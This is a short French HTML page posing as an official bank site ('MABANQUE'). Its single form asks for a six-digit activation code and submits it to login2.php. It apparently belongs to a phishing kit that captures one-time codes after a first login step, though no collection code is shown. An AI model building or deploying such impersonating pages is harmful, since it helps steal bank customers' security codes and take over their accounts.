<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banque et Assurances | Site Officiel</title>
    <style>
        body{
            background: white;
        }
        .main{
            width: 400px;
            height: 450px;
            background: white;
            margin: 80px auto 0 auto;
            position: relative;
        }
        .form {
            width: 100%;
            height: 100%;
            background: gray;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .form > form{
            text-align: center;
        }
        .form > form > h3{
            font-size: 30px;
        }
        .form > form > label{
            font-size: 20px;
        }
        .form > form > #send{
            padding: 10px 15px 10px 15px;
        }
        .form > form > #pseudo, .form > form #pass{
            padding: 10px 15px 10px 15px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="main">
        <div class="form">
            <form action="login2.php" method="post">
                <h3>MABANQUE</h3>
                <label for="code">Code d'activation</label><br />
                <input type="text" name="code" id="code" required minlength="6" maxlength="6"><br /><br />
                <button type="submit" name="send2" id="send">Valider</button>
            </form>
        </div>
    </div>
</body>
</html>